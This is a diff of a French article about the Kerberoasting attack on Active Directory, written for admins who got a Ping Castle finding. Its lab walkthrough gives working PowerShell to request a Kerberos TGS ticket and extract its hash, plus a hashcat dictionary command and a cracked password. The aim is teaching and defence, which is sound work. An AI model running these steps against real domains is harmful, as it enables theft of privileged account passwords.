@@ -8,7 +8,9 @@ listed: true
 
 Après un audit Ping Castle, vous êtes peut-être tombé sur la vulnérabilité "P-Kerberoasting" dans votre domaine (attaque Kerberoasting). Cette faille de sécurité est classée au niveau 1 de criticité (le plus élevé) par l'ANSSI et représente un **gros risque** pour votre Active Directory.
 
-La source de cette vulnérabilité est simple : un compte avec un haut niveau de privilège dans votre annuaire (*Admin du domaine* par exemple) possède une valeur inscrite dans son attribut `servicePrincipalName` (SPN). Cette valeur n'a pas besoin d'être valide ou de pointer vers un vrai serveur/service : sa simple présence suffit.
+La source de cette vulnérabilité est simple : un compte avec un haut niveau de privilège dans votre annuaire (*Admin du domaine* par exemple) possède une valeur inscrite dans son attribut `servicePrincipalName` (SPN). Cette valeur n'a pas besoin d'être valide ou de pointer vers un vrai serveur/service : sa simple présence suffit pour pouvoir demander un ticket Kerberos.
+
+L'attaque Kerberoasting est la contraction de "Kerberos" (le protocole d'authentification qui fourni le TGS) et de "roast(ing)" qui fait référence au fait de faire chauffer (ou rôtir plus exactement) avec du brute-force le ticket que l'on a réussi à obtenir.
 
 ### Fonctionnement du ServicePrincipalName
 
@@ -18,8 +20,6 @@ L'attribut `servicePrincipalName` permet plusieurs choses dans Active Directory 
 - **Authentification sécurisée :** Kerberos utilise le SPN pour générer un ticket d'accès au service demandé (TGS), chiffré avec le mot de passe de l'utilisateur qui porte le `servicePrincipalName`.
 
 ### Déroulement d'une attaque
-
-L'attaque Kerberoasting est la contraction de "Kerberos" (le protocole d'authentification qui fourni le TGS) et de "roast(ing)" qui fait référence au fait de faire chauffer (ou rôtir plus exactement) avec du brute-force le ticket que l'on a réussi à obtenir.
 
 Le principal problème réside dans le fait que **n'importe quel utilisateur du domaine** peut demander un ticket d'accès pour le compte qui porte le SPN (aucun privilège n'est nécessaire). Si on arrive à récupérer au moins un ticket TGS, alors on peut essayer de le *"brute-forcer"* hors-ligne pour obtenir le mot de passe du compte cible.
 
@@ -40,7 +40,7 @@ Bien évidemment, il n'est pas toujours possible de pouvoir faire ce genre d'act
 
 ## Exemple d'attaque
 
-Dans la suite de cet article nous utiliserons des commandes PowerShell du module Active Directory et le logiciel [hashcat](https://hashcat.net/hashcat/). Les deux sont facilement disponibles sous Windows. L'idée de cet article n'est pas de donner un guide détaillé sur cette attaque en environnement réel, mais plutôt de pouvoir la reproduire dans un lab pour démontrer son fonctionnement. Les commandes indiquées ne sont pas les plus performantes ou les plus discrètes.
+Dans la suite de cet article nous utiliserons des commandes PowerShell du module Active Directory et le logiciel [hashcat](https://hashcat.net/hashcat/). Les deux sont facilement disponibles sous Windows. L'idée de cet article n'est pas de donner un guide détaillé sur cette attaque en environnement réel, mais plutôt de pouvoir la reproduire dans un lab pour démontrer son fonctionnement.
 
 ### Création du compte
 
@@ -60,13 +60,15 @@ $splat = @{
 New-ADUser @splat
 ```
 
+### Récupération des informations
+
 On va ensuite collecter des informations liées à l'environnement Active Directory, pour permettre à hashcat de créer un ticket et comparer le résultat avec l'original. Nous avons besoin des informations suivantes :
 
 - Le nom DNS du domaine (contoso.com par exemple)
 - Le SamAccountName de l'utilisateur qui porte le SPN (smithjo)
 - La valeur du SPN que l'on va utiliser
 
-Récupération d'un SPN (n'importe lequel) :
+Voici le code pour récupérer les informations qui nous intéressent :
 
 ```powershell
 $domain = (Get-ADDomain).DNSRoot
@@ -75,17 +77,17 @@ $sam = $user.SamAccountName
 $spn = $user.servicePrincipalName[-1]
 ```
 
+### Récupération du ticket TGS
 
-
-Création d'un ticket Kerberos :
+On peut alors passer à la demande du ticket Kerberos en utilisant le SPN :
 
 ```powershell
 $ticket = [System.IdentityModel.Tokens.KerberosRequestorSecurityToken]::New($spn)
 ```
 
-Récupération du hash du ticket :
+### Récupération et traitement du hash
 
-Source du code : [Empire/data/module_source/credentials/Invoke-Kerberoast.ps1 at master · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660)
+On va maintenant tenter d'extraire la partie chiffré du ticket. Pour cela, je me suis servi dans le code disponible sur [Invoke-Kerberoast.ps1 · EmpireProject/Empire · GitHub](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1#L660).
 
 ```powershell
 $ticketByteStream = $ticket.GetRequest()
@@ -104,13 +106,37 @@ $hashcatFormat = '$krb5tgs$' + $etype + '$*' + $sam + '$' + $domain + '$' + $spn
 $hashcatFormat | Set-Clipboard
 ```
 
-On peut alors essayer de casser le hash avec [hashcat](https://hashcat.net/hashcat/) :
+Le hash obtenu ressemble alors à celui-ci :
+
+```plainprésentement
+$krb5tgs$23$*smithjo$contoso.com$MSSQLSvc/server.contoso.com*$abf9befd[...]f3ea6085
+```
+
+On y retrouve les informations suivantes :
+
+Information | Explication
+----------- | -----------
+`krb5tgs` | Hash Kerberos TGS
+`23` | Chiffrement utilisé : RC4-HMAC
+`smithjo` | Le SamAccountName du compte cible (celui qui porte le SPN)
+`contoso.com` | Le nom DNS du domaine Active Directory
+`MSSQLSvc/server.contoso.com` | Le ServicePrincipalName qui a été utilisé
+`abf9befd[...]f3ea6085` | Le hash du ticket, chiffré avec le mot de passe du compte `smithjo`
+
+### Roasting du hash
+
+On peut maintenant essayer de casser le hash avec [hashcat](https://hashcat.net/hashcat/).
+
+Pour plus d'accessibilité, on va mener une attaque par dictionnaire (qui est beaucoup moins coûteuse en ressources qu'une attaque par force brute). Le dictionnaire que j'utilise est [edermi Kerberoast PW list (XZ format) · GitHub](https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b).
 
 ```plaintext
 .\hashcat.exe -a 0 .\hash.txt .\kerberoast_pws.txt
 ```
 
-Le dictionnaire utilisé est le suivant : [edermi Kerberoast PW list (XZ format) · GitHub](https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b)
+La commande ci-dessus utilise deux fichiers externes :
+
+- "hash.txt" qui contient le hash récupéré et mis en forme pour hashcat
+- "kerberoast_pws.txt" qui contient le dictionnaire téléchargé sur GitHub
 
 Et au bout de quelques dizaines de secondes de traitement, on obtient le mot de passe en clair : `ZombieKiller2008`
 
